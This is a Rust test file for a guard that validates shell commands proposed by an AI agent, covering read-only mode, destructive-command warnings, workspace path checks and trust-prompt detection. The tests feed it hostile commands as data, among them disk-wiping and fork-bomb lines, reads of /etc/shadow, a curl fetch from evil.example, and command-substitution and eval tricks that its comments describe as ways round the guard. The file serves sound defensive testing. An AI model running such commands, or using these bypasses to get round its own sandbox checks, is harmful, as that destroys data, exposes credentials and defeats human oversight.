#[cfg(test)]
mod bash_read_only_tests {
    use crate::bash::{validate_command, validate_read_only, PermissionMode, ValidationResult};
    use std::path::Path;

    fn ro() -> PermissionMode {
        PermissionMode::ReadOnly
    }
    fn ws() -> PermissionMode {
        PermissionMode::WorkspaceWrite
    }
    fn workspace() -> &'static Path {
        Path::new("/workspace")
    }

    // ── read-only: write commands blocked ────────────────────────────────────

    #[test]
    fn blocks_rm_in_read_only() {
        let r = validate_read_only("rm -rf /tmp", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_cp_in_read_only() {
        let r = validate_read_only("cp src dst", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_mv_in_read_only() {
        let r = validate_read_only("mv a b", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_mkdir_in_read_only() {
        let r = validate_read_only("mkdir /tmp/test", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_touch_in_read_only() {
        let r = validate_read_only("touch file.txt", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_tee_in_read_only() {
        // Regression: tee was incorrectly listed as read-only upstream.
        let r = validate_read_only("tee output.txt", ro());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "tee must be blocked in read-only mode"
        );
    }

    #[test]
    fn blocks_write_redirection_in_read_only() {
        let r = validate_read_only("echo hello > file.txt", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_append_redirection_in_read_only() {
        let r = validate_read_only("echo hello >> file.txt", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_ls_in_read_only() {
        let r = validate_read_only("ls -la", ro());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_cat_in_read_only() {
        let r = validate_read_only("cat Cargo.toml", ro());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_grep_in_read_only() {
        let r = validate_read_only("grep -r pattern src/", ro());
        assert_eq!(r, ValidationResult::Allow);
    }

    // ── git in read-only ─────────────────────────────────────────────────────

    #[test]
    fn allows_git_status_in_read_only() {
        let r = validate_read_only("git status", ro());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_git_log_in_read_only() {
        let r = validate_read_only("git log --oneline -10", ro());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn blocks_git_push_in_read_only() {
        let r = validate_read_only("git push origin main", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_git_commit_in_read_only() {
        let r = validate_read_only("git commit -m 'msg'", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    // ── state-modifying in read-only ─────────────────────────────────────────

    #[test]
    fn blocks_apt_get_in_read_only() {
        let r = validate_read_only("apt-get install vim", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_npm_install_in_read_only() {
        let r = validate_read_only("npm install", ro());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    // ── non-read-only modes always allow ────────────────────────────────────

    #[test]
    fn workspace_write_allows_rm() {
        let r = validate_read_only("rm file.txt", ws());
        assert_eq!(r, ValidationResult::Allow);
    }

    // ── full pipeline ────────────────────────────────────────────────────────

    #[test]
    fn full_pipeline_allows_safe_command() {
        let r = validate_command("cargo build", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn full_pipeline_blocks_write_in_read_only() {
        let r = validate_command("rm file.txt", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }
}

#[cfg(test)]
mod bash_destructive_tests {
    use crate::bash::{check_destructive, ValidationResult};

    #[test]
    fn detects_rm_rf_root() {
        let r = check_destructive("rm -rf /");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn detects_rm_rf_home() {
        let r = check_destructive("rm -rf ~");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn detects_rm_rf_star() {
        let r = check_destructive("rm -rf *");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn detects_mkfs() {
        let r = check_destructive("mkfs.ext4 /dev/sdb");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn detects_dd() {
        let r = check_destructive("dd if=/dev/zero of=/dev/sda");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn detects_fork_bomb() {
        let r = check_destructive(":(){ :|:& };:");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn detects_shred() {
        let r = check_destructive("shred -u secret.txt");
        assert!(matches!(r, ValidationResult::Warn { .. }));
    }

    #[test]
    fn safe_rm_not_warned() {
        let r = check_destructive("rm file.txt");
        // no -r and -f together, no pattern match
        assert_eq!(r, ValidationResult::Allow);
    }
}

#[cfg(test)]
mod bash_sed_tests {
    use crate::bash::{validate_sed, PermissionMode, ValidationResult};

    #[test]
    fn sed_inplace_blocked_in_read_only() {
        let r = validate_sed("sed -i 's/foo/bar/' file.txt", PermissionMode::ReadOnly);
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn sed_without_inplace_allowed_in_read_only() {
        let r = validate_sed("sed 's/foo/bar/' file.txt", PermissionMode::ReadOnly);
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn sed_inplace_allowed_in_workspace_write() {
        let r = validate_sed(
            "sed -i 's/foo/bar/' file.txt",
            PermissionMode::WorkspaceWrite,
        );
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn non_sed_command_always_allowed() {
        let r = validate_sed("awk '{print $1}'", PermissionMode::ReadOnly);
        assert_eq!(r, ValidationResult::Allow);
    }
}

#[cfg(test)]
mod bash_classify_tests {
    use crate::bash::{classify_intent, CommandIntent};

    #[test]
    fn ls_is_read_only() {
        assert_eq!(classify_intent("ls -la"), CommandIntent::ReadOnly);
    }

    #[test]
    fn cat_is_read_only() {
        assert_eq!(classify_intent("cat file.txt"), CommandIntent::ReadOnly);
    }

    #[test]
    fn rm_is_destructive() {
        assert_eq!(classify_intent("rm file.txt"), CommandIntent::Destructive);
    }

    #[test]
    fn cp_is_write() {
        assert_eq!(classify_intent("cp a b"), CommandIntent::Write);
    }

    #[test]
    fn curl_is_network() {
        assert_eq!(
            classify_intent("curl https://example.com"),
            CommandIntent::Network
        );
    }

    #[test]
    fn npm_is_package_management() {
        assert_eq!(
            classify_intent("npm install express"),
            CommandIntent::PackageManagement
        );
    }

    #[test]
    fn sudo_is_system_admin() {
        assert_eq!(
            classify_intent("sudo apt-get update"),
            CommandIntent::SystemAdmin
        );
    }

    #[test]
    fn git_status_is_read_only() {
        assert_eq!(classify_intent("git status"), CommandIntent::ReadOnly);
    }

    #[test]
    fn git_push_is_write() {
        assert_eq!(
            classify_intent("git push origin main"),
            CommandIntent::Write
        );
    }

    #[test]
    fn sed_inplace_is_write() {
        assert_eq!(
            classify_intent("sed -i 's/foo/bar/' file"),
            CommandIntent::Write
        );
    }
}

#[cfg(test)]
mod redirect_validation_tests {
    //! Read-redirection awareness for `validate_paths`.
    //!
    //! Threat model: an agent constructs a Bash command that uses an explicit
    //! `<` redirection to read a file outside the configured workspace, e.g.
    //! `cat < /etc/shadow`. Without read-target collection, `validate_paths`
    //! only inspects write targets, so the redirect bypasses the boundary.
    //!
    //! `<<` (here-doc) and `<<<` (here-string) consume their next token as
    //! data, not as a path, so they must NOT yield a path-validation target.
    //! `shell_split` keeps `<<` and `<<<` as single tokens (it does not split
    //! on `<`/`>`), so an exact-match on `READ_PATH_REDIRECTIONS = &["<"]`
    //! naturally excludes them — no tokenizer change is needed.
    //!
    //! `cmd <input` (no whitespace between `<` and the path) is also kept as
    //! a single token by `shell_split`, so it is NOT collected. This matches
    //! the existing write-side behaviour for `cmd >output`.

    use crate::bash::{validate_bash_command, validate_paths, PermissionMode, ValidationResult};
    use std::path::Path;

    #[derive(Clone, Copy)]
    enum Expected {
        Allow,
        Block,
    }

    fn assert_case(
        label: &str,
        command: &str,
        mode: PermissionMode,
        workspace: &Path,
        expected: Expected,
    ) {
        // Use the full pipeline for end-to-end coverage; tests in this module
        // intentionally exercise commands that pass `validate_read_only`.
        let result = validate_bash_command(command, mode, workspace);
        match (expected, &result) {
            (Expected::Allow, ValidationResult::Allow) => {}
            (Expected::Block, ValidationResult::Block { .. }) => {}
            _ => panic!(
                "case `{label}` failed: command={command:?} mode={mode:?} workspace={workspace:?} expected={:?} got={result:?}",
                match expected {
                    Expected::Allow => "Allow",
                    Expected::Block => "Block",
                },
            ),
        }
    }

    #[test]
    fn redirect_validation_table() {
        let ws = Path::new("/workspace");
        let tmp_x = Path::new("/tmp/x");

        // Each row: (label, command, mode, workspace, expected).
        let cases: &[(&str, &str, PermissionMode, &Path, Expected)] = &[
            // 1. Absolute read target outside workspace, ReadOnly mode.
            (
                "read_outside_readonly",
                "cat < /etc/shadow",
                PermissionMode::ReadOnly,
                ws,
                Expected::Block,
            ),
            // 2. Absolute read target outside workspace, WorkspaceWrite mode.
            (
                "read_outside_workspace_write",
                "cat < /etc/shadow",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Block,
            ),
            // 3. Absolute read target inside workspace, ReadOnly mode.
            (
                "read_inside_readonly",
                "cat < /workspace/file.txt",
                PermissionMode::ReadOnly,
                ws,
                Expected::Allow,
            ),
            // 4. Here-doc — next token is a delimiter, not a path.
            (
                "heredoc_allowed",
                "cat << EOF\nbody\nEOF",
                PermissionMode::ReadOnly,
                ws,
                Expected::Allow,
            ),
            // 5. Here-string — next token is literal data, not a path.
            (
                "herestring_allowed",
                "cat <<< \"literal string\"",
                PermissionMode::ReadOnly,
                ws,
                Expected::Allow,
            ),
            // 6. Mixed `< input > output` where the read target is outside.
            //    Use WorkspaceWrite so the substring `>` doesn't trip
            //    `validate_read_only`'s write-redirection guard. The write
            //    target is in-workspace, so only the read target should fire.
            (
                "mixed_read_outside_write_inside",
                "cmd < /etc/passwd > /workspace/output.txt",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Block,
            ),
            // 6b. Mixed `< input > output` where both are clean.
            (
                "mixed_both_clean",
                "cmd < /workspace/in.txt > /workspace/out.txt",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Allow,
            ),
            // 7. `cmd <input` — no whitespace. After the glued-redirection
            //    fix, `shell_split` splits on unquoted `<` and `>` so the
            //    target is tokenized and reaches the read-target scan.
            //    Matches the symmetric write-side fix for `cmd>file`.
            (
                "no_space_redirect_blocked_after_glued_fix",
                "cat </etc/shadow",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Block,
            ),
            // 8. Semicolon-separated segments — both have outside reads.
            (
                "semicolon_segments_first_blocks",
                "cat < /etc/passwd ; cat < /etc/shadow",
                PermissionMode::ReadOnly,
                ws,
                Expected::Block,
            ),
            // 9. Relative path with `..` parent escape.
            (
                "parent_dir_escape",
                "cat < ../../../etc/passwd",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Block,
            ),
            // 10. `$VAR`-prefixed target — skipped (we don't expand vars).
            (
                "dollar_prefix_skipped",
                "cat < $VAR/file",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Allow,
            ),
            // 11. `/dev/null` — special-case skip.
            (
                "dev_null_skipped",
                "cat < /dev/null",
                PermissionMode::ReadOnly,
                ws,
                Expected::Allow,
            ),
            // 12. Relative `./input.txt` in WorkspaceWrite — no parent
            //     escape, mirrors write-target relative-path behaviour.
            (
                "relative_dot_path_allowed",
                "cat < ./input.txt",
                PermissionMode::WorkspaceWrite,
                tmp_x,
                Expected::Allow,
            ),
            // 13. Bypass attempt: quoted absolute outside-workspace path.
            //     The trim_matches on quotes strips them before validation.
            (
                "quoted_path_still_blocked",
                "cat < \"/etc/shadow\"",
                PermissionMode::ReadOnly,
                ws,
                Expected::Block,
            ),
            // 14. Bypass attempt: pipeline segment with read redirect.
            (
                "pipeline_segment_read_blocked",
                "echo hi | cat < /etc/shadow",
                PermissionMode::WorkspaceWrite,
                ws,
                Expected::Block,
            ),
        ];

        for (label, cmd, mode, workspace, expected) in cases {
            assert_case(label, cmd, *mode, workspace, *expected);
        }
    }

    #[test]
    fn validate_paths_directly_blocks_read_target_outside_workspace() {
        // Direct validate_paths exercise to lock in the failure mode at the
        // function granularity (skipping validate_read_only's substring guard).
        let result = validate_paths(
            "cat < /etc/shadow",
            PermissionMode::ReadOnly,
            Path::new("/workspace"),
        );
        assert!(matches!(result, ValidationResult::Block { .. }));
    }

    #[test]
    fn validate_paths_directly_allows_read_inside_workspace() {
        let result = validate_paths(
            "cat < /workspace/notes.txt",
            PermissionMode::ReadOnly,
            Path::new("/workspace"),
        );
        assert_eq!(result, ValidationResult::Allow);
    }

    #[test]
    fn validate_paths_block_message_says_read_target() {
        let result = validate_paths(
            "cat < /etc/shadow",
            PermissionMode::ReadOnly,
            Path::new("/workspace"),
        );
        match result {
            ValidationResult::Block { reason } => {
                assert!(
                    reason.contains("read target"),
                    "block reason should identify the read target, got: {reason}"
                );
            }
            other => panic!("expected Block, got {other:?}"),
        }
    }
}

#[cfg(test)]
mod path_tests {
    use crate::path::{
        detect_trust_prompt, validate_path_access, TrustConfig, TrustDecision, TrustPolicy,
        TrustResolver,
    };

    // ── detect_trust_prompt ──────────────────────────────────────────────────

    #[test]
    fn detects_trust_cue_do_you_trust() {
        assert!(detect_trust_prompt(
            "Do you trust the files in this folder?"
        ));
    }

    #[test]
    fn detects_trust_cue_allow_and_continue() {
        assert!(detect_trust_prompt("Please allow and continue to proceed."));
    }

    #[test]
    fn does_not_detect_unrelated_text() {
        assert!(!detect_trust_prompt("Hello, how can I help you today?"));
    }

    #[test]
    fn case_insensitive_detection() {
        assert!(detect_trust_prompt("TRUST THIS FOLDER"));
    }

    // ── TrustResolver ────────────────────────────────────────────────────────

    #[test]
    fn no_trust_prompt_returns_not_required() {
        let cfg = TrustConfig::new();
        let resolver = TrustResolver::new(cfg);
        let decision = resolver.resolve_with_text("/workspace", "Hello world");
        assert_eq!(decision, TrustDecision::NotRequired);
    }

    #[test]
    fn allowlisted_path_auto_trusts() {
        let cfg = TrustConfig::new().with_allowlisted("/workspace");
        let resolver = TrustResolver::new(cfg);
        let decision =
            resolver.resolve_with_text("/workspace", "do you trust the files in this folder");
        assert_eq!(decision.policy(), Some(TrustPolicy::AutoTrust));
    }

    #[test]
    fn denied_path_returns_deny() {
        let cfg = TrustConfig::new().with_denied("/malicious");
        let resolver = TrustResolver::new(cfg);
        let decision =
            resolver.resolve_with_text("/malicious", "do you trust the files in this folder");
        assert_eq!(decision.policy(), Some(TrustPolicy::Deny));
    }

    #[test]
    fn unknown_path_requires_approval() {
        let cfg = TrustConfig::new();
        let resolver = TrustResolver::new(cfg);
        let decision =
            resolver.resolve_with_text("/unknown", "do you trust the files in this folder");
        assert_eq!(decision.policy(), Some(TrustPolicy::RequireApproval));
    }

    // ── validate_path_access ─────────────────────────────────────────────────

    #[test]
    fn path_inside_trusted_root_is_valid() {
        // Use /tmp which always exists and canonicalizes
        assert!(validate_path_access("/tmp", "/tmp"));
    }

    #[test]
    fn root_path_outside_tmp_is_invalid() {
        assert!(!validate_path_access("/etc/passwd", "/tmp"));
    }
}

// ── path.rs coverage backfill (S4-6) ─────────────────────────────────────────
//
// Locks down branches not exercised by the existing path_tests module:
//   * `TrustEvent::TrustRequired` is always emitted when prompt is detected.
//   * `TrustResolver::resolve` (the convenience wrapper) returns the same
//     verdict as `resolve_with_text` with the canonical prompt.
//   * `TrustResolver::is_trust_prompt` static helper agrees with
//     `detect_trust_prompt`.
//   * `TrustResolver::trusts` short-circuits on denied even when also
//     allowlisted.
//   * `TrustDecision::events()` is empty for `NotRequired` and non-empty
//     for `Required`.
//   * `path_matches_trusted_root` resolves prefix inclusion correctly,
//     including `..` segments that escape the candidate root.
//   * Multiple allowlisted/denied roots are honored (linear `iter().any()`
//     covers list traversal beyond a single entry).
//   * Denied root precedence: when a path matches both allow and deny,
//     the deny path is taken.
#[cfg(test)]
mod path_coverage_tests {
    use crate::path::{
        detect_trust_prompt, path_matches_trusted_root, TrustConfig, TrustDecision, TrustEvent,
        TrustPolicy, TrustResolver,
    };

    #[test]
    fn trust_required_event_always_emitted_when_prompt_detected() {
        let resolver = TrustResolver::new(TrustConfig::new());
        let decision = resolver.resolve_with_text("/cwd", "trust this folder");
        let events = decision.events();
        assert!(
            matches!(events.first(), Some(TrustEvent::TrustRequired { cwd }) if cwd == "/cwd"),
            "first event must be TrustRequired with the cwd; got {:?}",
            events
        );
    }

    #[test]
    fn trust_resolved_event_carries_policy_for_allowlisted() {
        let cfg = TrustConfig::new().with_allowlisted("/work");
        let resolver = TrustResolver::new(cfg);
        let decision = resolver.resolve_with_text("/work", "trust this folder");
        let events = decision.events();
        let resolved = events
            .iter()
            .find_map(|e| match e {
                TrustEvent::TrustResolved { cwd, policy } => Some((cwd.clone(), *policy)),
                _ => None,
            })
            .expect("expected TrustResolved event for allowlisted cwd");
        assert_eq!(resolved.0, "/work");
        assert_eq!(resolved.1, TrustPolicy::AutoTrust);
    }

    #[test]
    fn trust_denied_event_carries_reason_for_denied_root() {
        let cfg = TrustConfig::new().with_denied("/blocked");
        let resolver = TrustResolver::new(cfg);
        let decision = resolver.resolve_with_text("/blocked", "trust this folder");
        let events = decision.events();
        let denied_reason = events
            .iter()
            .find_map(|e| match e {
                TrustEvent::TrustDenied { reason, .. } => Some(reason.clone()),
                _ => None,
            })
            .expect("expected TrustDenied event for denied cwd");
        assert!(
            denied_reason.contains("/blocked"),
            "deny reason should reference the matched root: {}",
            denied_reason
        );
    }

    #[test]
    fn resolver_resolve_uses_canonical_prompt() {
        let resolver = TrustResolver::new(TrustConfig::new());
        // The plain `resolve` wrapper must trigger the prompt detection
        // path and return the same shape as resolve_with_text.
        let decision = resolver.resolve("/anywhere");
        assert_eq!(decision.policy(), Some(TrustPolicy::RequireApproval));
    }

    #[test]
    fn is_trust_prompt_static_helper_agrees_with_detect_fn() {
        assert!(TrustResolver::is_trust_prompt("trust this folder"));
        assert!(!TrustResolver::is_trust_prompt("hi there"));
        // Static helper and free function must agree.
        assert_eq!(
            TrustResolver::is_trust_prompt("yes, proceed"),
            detect_trust_prompt("yes, proceed"),
        );
    }

    #[test]
    fn trusts_returns_true_for_allowlisted_only() {
        let resolver =
            TrustResolver::new(TrustConfig::new().with_allowlisted("/Users/me/projects"));
        assert!(resolver.trusts("/Users/me/projects"));
        assert!(resolver.trusts("/Users/me/projects/agent-guard"));
        assert!(!resolver.trusts("/Users/other"));
    }

    #[test]
    fn trusts_returns_false_when_only_denied() {
        let resolver = TrustResolver::new(TrustConfig::new().with_denied("/no-go"));
        assert!(!resolver.trusts("/no-go"));
        assert!(!resolver.trusts("/no-go/sub"));
        // Not allowlisted either, so still false.
        assert!(!resolver.trusts("/anywhere-else"));
    }

    #[test]
    fn trusts_denied_root_overrides_allowlisted() {
        let cfg = TrustConfig::new()
            .with_allowlisted("/shared")
            .with_denied("/shared/secret");
        let resolver = TrustResolver::new(cfg);
        // /shared is allowed.
        assert!(resolver.trusts("/shared"));
        // /shared/secret is denied even though it sits under an allowlisted root.
        assert!(!resolver.trusts("/shared/secret"));
        assert!(!resolver.trusts("/shared/secret/inner"));
    }

    #[test]
    fn resolve_denied_takes_precedence_over_allowlist() {
        let cfg = TrustConfig::new()
            .with_allowlisted("/shared")
            .with_denied("/shared/secret");
        let resolver = TrustResolver::new(cfg);
        let decision = resolver.resolve_with_text("/shared/secret", "trust this folder");
        assert_eq!(decision.policy(), Some(TrustPolicy::Deny));
    }

    #[test]
    fn resolver_walks_multiple_allowlisted_roots_to_find_match() {
        let cfg = TrustConfig::new()
            .with_allowlisted("/first")
            .with_allowlisted("/second")
            .with_allowlisted("/third");
        let resolver = TrustResolver::new(cfg);
        // Hits the third allowlisted entry; covers the iter().any() loop.
        let decision = resolver.resolve_with_text("/third/sub", "trust this folder");
        assert_eq!(decision.policy(), Some(TrustPolicy::AutoTrust));
    }

    #[test]
    fn resolver_walks_multiple_denied_roots_to_find_match() {
        let cfg = TrustConfig::new()
            .with_denied("/d1")
            .with_denied("/d2")
            .with_denied("/d3");
        let resolver = TrustResolver::new(cfg);
        let decision = resolver.resolve_with_text("/d3/leaf", "trust this folder");
        assert_eq!(decision.policy(), Some(TrustPolicy::Deny));
    }

    #[test]
    fn not_required_decision_returns_empty_events_slice() {
        let decision = TrustDecision::NotRequired;
        assert!(decision.events().is_empty());
        assert!(decision.policy().is_none());
    }

    /// Build an isolated, canonicalizable directory tree for path-matching
    /// tests so that platform-specific canonicalization (e.g. `/tmp` ->
    /// `/private/tmp` on macOS) is handled consistently for both root and
    /// candidate. Returns the canonicalized root path.
    fn make_isolated_root(unique: &str) -> std::path::PathBuf {
        let mut root = std::env::temp_dir();
        let pid = std::process::id();
        root.push(format!("agent-guard-path-tests-{pid}-{unique}"));
        std::fs::create_dir_all(&root).expect("create isolated root");
        std::fs::canonicalize(&root).expect("canonicalize root")
    }

    #[test]
    fn path_matches_trusted_root_accepts_exact_and_descendants() {
        let root = make_isolated_root("descendants");
        let sub = root.join("sub");
        std::fs::create_dir_all(&sub).expect("create sub");
        let sub = std::fs::canonicalize(&sub).expect("canonicalize sub");

        let root_str = root.to_str().expect("root utf-8");
        let sub_str = sub.to_str().expect("sub utf-8");
        assert!(path_matches_trusted_root(root_str, root_str));
        assert!(path_matches_trusted_root(sub_str, root_str));

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn path_matches_trusted_root_rejects_unrelated_roots() {
        let a = make_isolated_root("unrelated-a");
        let b = make_isolated_root("unrelated-b");
        let a_str = a.to_str().expect("a utf-8");
        let b_str = b.to_str().expect("b utf-8");
        assert!(!path_matches_trusted_root(a_str, b_str));
        assert!(!path_matches_trusted_root(b_str, a_str));

        let _ = std::fs::remove_dir_all(&a);
        let _ = std::fs::remove_dir_all(&b);
    }

    #[test]
    fn path_matches_trusted_root_handles_dot_dot_lexical_normalization() {
        let root = make_isolated_root("dotdot");
        let root_str = root.to_str().expect("root utf-8");
        // <root>/a/.. lexically normalizes to <root>; even if "a" does not
        // exist, the lexical pass keeps the test deterministic on CI.
        let dotdot = format!("{root_str}/a/..");
        assert!(path_matches_trusted_root(&dotdot, root_str));

        let _ = std::fs::remove_dir_all(&root);
    }
}

// ── Substitution and newline-separator regression coverage ───────────────────
//
// Regression tests for the two CRITICAL findings in docs/audits/2026-05-14.md:
//
// 1. Command substitution (`$(...)`, backticks, process substitution
//    `<(...)` / `>(...)`) was tokenized as ordinary characters, leaving
//    the inner command unvalidated and `$`-prefixed write targets silently
//    skipped in `validate_paths`.
// 2. Newline (`\n`) was treated as whitespace inside `shell_split`,
//    causing multi-statement commands joined by `\n` to be validated only
//    against the first statement while `sh -c` honored the rest at
//    execution time.
//
// Parameter expansion (`${VAR}`) and bare variable reference (`$VAR`) are
// intentionally NOT blocked — they expand to a value, not to a separately
// executed command, and are common in legitimate workflows.
#[cfg(test)]
mod bash_substitution_and_separator_tests {
    use crate::bash::{validate_bash_command, PermissionMode, ValidationResult};
    use std::path::Path;

    fn ro() -> PermissionMode {
        PermissionMode::ReadOnly
    }
    fn ws() -> PermissionMode {
        PermissionMode::WorkspaceWrite
    }
    fn workspace() -> &'static Path {
        Path::new("/workspace")
    }

    // ── command substitution ────────────────────────────────────────────────

    #[test]
    fn blocks_dollar_paren_command_substitution_readonly() {
        let r = validate_bash_command("echo $(rm -rf /etc/passwd)", ro(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "$(...) must be blocked; got {r:?}"
        );
    }

    #[test]
    fn blocks_dollar_paren_redirection_target_workspace_write() {
        // Audit 2026-05-14: `echo data > $(echo /etc/passwd)` tokenized so
        // the redirection target started with `$`, which `validate_paths`
        // silently skipped, allowing the substituted host path to be
        // written at execution time.
        let r = validate_bash_command("echo data > $(echo /etc/passwd)", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_glued_dollar_paren_redirection_workspace_write() {
        // Quoted, glued form: `>"$(...)"` collapses into a single token
        // because shell_split does not split on `>`. The substitution
        // check still catches the `$(` substring inside the token.
        let r = validate_bash_command("echo data >\"$(echo /etc/passwd)\"", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_backtick_command_substitution_readonly() {
        let r = validate_bash_command("echo `rm -rf /workspace/data`", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_process_substitution_read_form_workspace_write() {
        let r = validate_bash_command("cat <(curl http://evil.example/x)", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn blocks_process_substitution_write_form_workspace_write() {
        let r = validate_bash_command("tee >(rm -rf /workspace/x)", ws(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
    fn allows_brace_parameter_expansion_workspace_write() {
        let r = validate_bash_command("echo ${HOME}", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    #[test]
    fn allows_bare_dollar_variable_workspace_write() {
        let r = validate_bash_command("echo $PATH", ws(), workspace());
        assert_eq!(r, ValidationResult::Allow);
    }

    // ── quoting context: literal forms must NOT trigger substitution block ──
    //
    // Audit 2026-05-21 dogfood finding: the substitution detector ignored
    // quoting context, so `$(...)` and backticks inside single-quoted strings
    // or quoted-delimiter heredoc bodies were blocked even though the shell
    // would treat them as literal text. These tests pin the corrected
    // semantics.

    #[test]
    fn allows_dollar_paren_inside_single_quotes() {
        let r = validate_bash_command("echo 'literal $(date) text'", ws(), workspace());
        assert_eq!(
            r,
            ValidationResult::Allow,
            "single quotes disable substitution; got {r:?}"
        );
    }

    #[test]
    fn allows_backtick_inside_single_quotes() {
        let r = validate_bash_command("echo 'literal `date` text'", ws(), workspace());
        assert_eq!(
            r,
            ValidationResult::Allow,
            "single quotes disable substitution; got {r:?}"
        );
    }

    #[test]
    fn allows_escaped_dollar_paren_outside_quotes() {
        let r = validate_bash_command("echo \\$(date)", ws(), workspace());
        assert_eq!(
            r,
            ValidationResult::Allow,
            "escaped $ is not substitution; got {r:?}"
        );
    }

    #[test]
    fn allows_backtick_inside_quoted_delimiter_heredoc() {
        let cmd = "cat <<'EOF'\ntext with `backticks` and $(literals)\nEOF";
        let r = validate_bash_command(cmd, ws(), workspace());
        assert_eq!(
            r,
            ValidationResult::Allow,
            "<<'EOF' body is literal; got {r:?}"
        );
    }

    #[test]
    fn allows_backtick_inside_double_quoted_delimiter_heredoc() {
        let cmd = "cat <<\"EOF\"\nbody with `backticks`\nEOF";
        let r = validate_bash_command(cmd, ws(), workspace());
        assert_eq!(
            r,
            ValidationResult::Allow,
            "<<\"EOF\" body is literal in bash; got {r:?}"
        );
    }

    #[test]
    fn allows_dash_quoted_heredoc_body() {
        let cmd = "cat <<-'END'\n\tbody $(no_run) and `no_run`\n\tEND";
        let r = validate_bash_command(cmd, ws(), workspace());
        assert_eq!(
            r,
            ValidationResult::Allow,
            "<<-'END' body is literal; got {r:?}"
        );
    }

    // Adversarial: substitution is still active inside double-quoted strings
    // and unquoted-delimiter heredocs. These must remain blocked.

    #[test]
    fn blocks_dollar_paren_inside_double_quotes() {
        let r = validate_bash_command("echo \"output: $(date)\"", ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "double quotes do NOT disable substitution; got {r:?}"
        );
    }

    #[test]
    fn blocks_backtick_inside_double_quotes() {
        let r = validate_bash_command("echo \"output: `date`\"", ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "double quotes do NOT disable backticks; got {r:?}"
        );
    }

    #[test]
    fn blocks_substitution_inside_unquoted_heredoc() {
        let cmd = "cat <<EOF\n$(rm -rf /etc/passwd)\nEOF";
        let r = validate_bash_command(cmd, ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "<<EOF body is expanded; got {r:?}"
        );
    }

    #[test]
    fn blocks_substitution_after_quoted_heredoc_closes() {
        // A literal heredoc body must not leak its safe-context into
        // subsequent commands. After `EOF` closes, a `;` `$(...)` is back
        // in normal context and must block.
        let cmd = "cat <<'EOF'\nliteral `body`\nEOF\n$(rm -rf /etc/passwd)";
        let r = validate_bash_command(cmd, ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "post-heredoc substitution must still block; got {r:?}"
        );
    }

    // ── code-laundering builtins (eval / source / .) ────────────────────────
    //
    // The substitution gate skips single-quoted regions because the shell
    // treats them as literal — `'$(whoami)'` is just a string. But bash
    // builtins `eval`, `source`, and `.` *re-parse* their string args as
    // shell code, which would re-introduce substitution. These builtins
    // are opaque code launderers and must be blocked outright in
    // ReadOnly + WorkspaceWrite modes, like `python -c` / `bash -c`.

    #[test]
    fn blocks_eval_with_single_quoted_substitution_workspace_write() {
        let r = validate_bash_command("eval '$(whoami)'", ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "eval with laundered substitution must block; got {r:?}"
        );
    }

    #[test]
    fn blocks_eval_with_literal_string_workspace_write() {
        // Even with no substitution syntax visible, `eval "literal"` is
        // opaque code execution and must be blocked.
        let r = validate_bash_command("eval \"echo hello\"", ws(), workspace());
        assert!(
            matches!(r, ValidationResult::Block { .. }),
            "eval is opaque code execution; got {r:?}"
        );
    }

    #[test]
    fn blocks_eval_in_readonly_mode() {
        let r = validate_bash_command("eval 'whoami'", ro(), workspace());
        assert!(matches!(r, ValidationResult::Block { .. }));
    }

    #[test]
